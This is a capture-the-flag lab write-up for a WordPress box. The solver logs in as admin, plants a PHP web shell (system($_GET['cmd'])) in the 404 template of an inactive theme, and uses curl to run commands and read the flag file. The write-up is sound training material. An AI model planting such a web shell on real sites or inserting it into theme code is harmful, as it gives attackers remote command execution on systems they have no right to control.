
## Challenge 1

Use the credentials for the admin user [admin:sunshine1] and upload a webshell to your target. Once you have access to the target, obtain the contents of the "flag.txt" file in the home directory for the "wp-user" directory.

## Solution

On `http://94.237.58.244:48092/wp-login.php` it is the login panel, where we use the provided credentials to login.

On `Apperance` - `Theme Editor` I wen to edit the theme `Twenty Nineteen` as it is not active, and choose the `404` file.

I add the web shell there:

```php
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package WordPress
 * @subpackage Twenty_Nineteen
 * @since 1.0.0
 */

system($_GET['cmd']);
?>



<?php
get_footer();
```

Then by using `cURL` I check if I can get RCE:

```sh
curl -X GET "http://94.237.58.244:48092/wp-content/themes/twentynineteen/404.php?cmd=id"
uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)



<br />
<b>Fatal error</b>:  Uncaught Error: Call to undefined function get_footer() in /usr/src/wordpress/wp-content/themes/twentynineteen/404.php:18
Stack trace:
#0 {main}
  thrown in <b>/usr/src/wordpress/wp-content/themes/twentynineteen/404.php</b> on line <b>18</b><br />
```

So I got the output of the command back, and now I will try to read the flag file.

First I confirm the location:

```sh
curl -X GET "http://94.237.58.244:48092/wp-content/themes/twentynineteen/404.php?cmd=ls%20/home/wp-user"
flag.txt
```

Then I read it using `cat`.

```sh
curl -X GET "http://94.237.58.244:48092/wp-content/themes/twentynineteen/404.php?cmd=cat%20/home/wp-user/flag.txt"
HTB{rc3_By_d3s1gn}
```

